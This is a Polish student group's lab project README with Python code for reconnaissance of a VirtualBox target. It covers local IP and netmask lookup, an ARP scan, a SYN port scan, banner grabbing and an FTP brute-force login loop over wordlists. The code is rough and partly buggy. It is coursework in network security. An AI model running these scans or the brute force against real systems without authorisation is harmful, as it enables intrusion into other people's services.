# Projekt-JDD

Grupa w składzie:
- Jerzy Tarasiewicz
- Damian Tomala
- Dorota Gliniak

Grupa podjęła decyzję o tym aby wszystkie 6 zadań były w jednym pliku pod tytułem "project.py".

# Zadanie numer 1:
Ustalić własny IP.
W terminalu wykonaliśmy polecenie (ip a)
Załączniki w postaci screenshotów:
-Zadanie 1 SS1
-Zadanie 1 SS2

# Zadanie numer 2:
Ustalić maskę podsieci.
W terminalu wykonalismy polecenie (ifconfig)
Załączniki w postaci screenshotów:
- Zadanie 2 SS1
- Zadanie 2 SS2

# Zadanie numer 3:
Na podstawie powyższych informacji przeskanować sieć i ustalić adres IP celu.

Otworzyliśmy VBox i sprawdziliśmy MAC adres celu. Po czym ustaliliśmy adres IP celu na podstawie zadania 1 oraz 2.
Załączniki w postaci screenshotów:
- Zadanie 3 SS1
- Zadanie 3 SS2

# Zadanie numer 4:
Ustalić otwarte porty na atakowanej maszynie.

Załączniki w postaci screenshotów:
- Zadanie 4 SS1

# Zadanie numer 5:
Ustalić nazwę oraz wersję oprogramowania dla wszystkich znalezionych usług (banner grabbing).

Załączniki w postaci screenshotów:
- Zadanie 4 SS1

# Zadanie numer 6:
Przeprowadzić atak brute-force na dowolną znalezioną usługę (nie musi się udać).

Załączniki w postaci screenshotów:
- Zadanie 6 SS1



# KOD

################################ 1 - GET LOCAL IP ADDRESS ################################

import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

local_ip = get_local_ip()
print(local_ip)

################################ 2 - GET MASK ADDRESS ################################

from pyroute2 import IPRoute
ip = IPRoute()
info = [{'iface': x['index'], 'addr': x.get_attr('IFA_ADDRESS'), 'mask':  x['prefixlen']} for x in ip.get_addr()]

print(info)
a = info[1]

for k, v in a.items():
    if k == 'mask':
        print(v)
        break
masks = {0:'0.0.0.0', 1:'128.0.0.0', 2:'192.0.0.0', 3:'224.0.0.0', 4:'240.0.0.0', 5:'248.0.0.0', 6:'252.0.0.0', 7:'254.0.0.0', 8:'255.0.0.0', 9:'255.128.0.0', 10:'255.192.0.0', 11:'255.224.0.0', 12:'255.240.0.0', 13:'255.248.0.0', 14:'255.252.0.0', 15:'255.254.0.0', 16:'255.255.0.0', 17:'255.255.128.0', 18:'255.255.192.0', 19:'255.255.224.0', 20:'255.255.240.0', 21:'255.255.248.0', 22:'255.255.252.0', 23:'255.255.254.0', 24:'255.255.255.0', 25:'255.255.255.128', 26:'255.255.255.192', 27:'255.255.255.224', 28:'255.255.255.240', 29:'255.255.255.248', 30:'255.255.255.252', 31:'255.255.255.254', 32:'255.255.255.255'}

for index, mask in masks.items():

    if index == v:
        index == mask
        print("netmask: ", mask)
        break

################################ 3 - Looking for target IP ################################


from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether
from scapy.layers.l2 import ARP

for i in range(100, 105):
    ip = "192.168.0.{}".format(i)
    pakiet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
    dane = srp1(pakiet, timeout=1, verbose=0)
    target_MAC = '08:00:27:89:f6:2e'

    if dane:
        print("adres IP: {}, adres MAC: {}".format(str(dane.psrc), str(dane.hwsrc)))
        if target_MAC == dane.hwsrc:
            print("Target IP: ", str(dane.psrc))
            target_IP = dane.psrc

################################ 4 - Ports scaning ################################

cel = target_IP
pakiet = IP(dst="google.com")/ICMP()/"Projekt"
for port in range(22):
    pakiet = IP(dst=cel)/TCP(dport=[port], flags = "S")
    rec, wrong = sr(pakiet, timeout=1, verbose=0)
    print(rec)
    
    if rec:
        usluga = "{}".format(str(str(rec[0]).split(" ")[7][6:]))
        dane = f"Port: {port} otwarty, usluga = {usluga}"
        print(dane)
    else:
        print(f"{port} Port zablokowany")

################################ 5 - Banner Grabbing ################################

import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

target = target_IP

for port in range(1, 65000):
    try:
        connection = s.connect((target, port))
        print(f"[+] {target}: port {port} is OPEN")
        s.send("Get banner \r\n".encode())
        response = s.recv((2048)).decode()
        print("Name and version service: ", response)
    except:
        pass

################################ 6 - Brute Force ################################

import ftplib
users = open("usernames.txt", "r")
passwords = open("passlist.txt", "r")

target = target_IP
for user in users:
    for password in passwords:
        print(f"Trying> {user}:{password}")

        try:
            ftp_server = ftplib.FTP()
            ftp_server.connect(target, 21, timeout=2)
            ftp_server.login(user, password)
            print("[+] Login successful.")
            ftp_server.close()
        except Exception as exc:
            print("[-] Brute-force attack failed!")
